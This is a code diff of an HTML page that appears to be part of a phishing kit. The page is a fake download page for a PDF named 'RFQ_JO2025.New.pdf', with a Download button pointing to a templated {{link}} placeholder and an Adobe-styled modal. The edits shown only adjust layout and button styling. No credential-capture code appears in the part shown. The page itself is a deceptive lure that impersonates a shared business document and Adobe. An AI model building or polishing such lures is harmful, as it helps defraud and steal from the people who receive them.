@@ -21,18 +21,20 @@
         }
     </style>
 </head>
-
-<body class="bg-light d-flex justify-content-center align-items-center vh-100">
-    <div class="container catalogue text-center bg-light p-4">
+<body class="bg-light d-flex justify-content-center align-items-center min-vh-100">
+    <div class="container catalogue text-center bg-light p-4 pb-5">
         <div class="display-4 text-danger mb-3">
             <img src="https://file-personal.cloudmailbox.net/reference/images/filetypes/v4_pdf.png" alt="">
         </div>
         <h5 class="fw-bold">RFQ_JO2025.New.pdf</h5>
-        <p class=" mb-2"><span class="fw-bold">31.5MB</span></p>
+        <p class="mb-2"><span class="fw-bold">31.5MB</span></p>
      
-        <a href="{{link}}"><button type="button" class="btn btn-primary mt-3 px-5 rounded-0 fs-5" data-bs-toggle="modal" data-bs-target="#adobeModal" onclick="openModal()">Download</button></a>
-        <br>
-        <br>
+        <a href="{{link}}">
+            <button type="button" class="btn btn-primary mt-3 px-5 rounded-0 fs-5 w-100">
+                Download
+            </button>
+        </a>
+        <br><br>
     </div>
 
     <div class="modal fade" id="adobeModal" tabindex="-1" aria-labelledby="adobeModalLabel" aria-hidden="true">
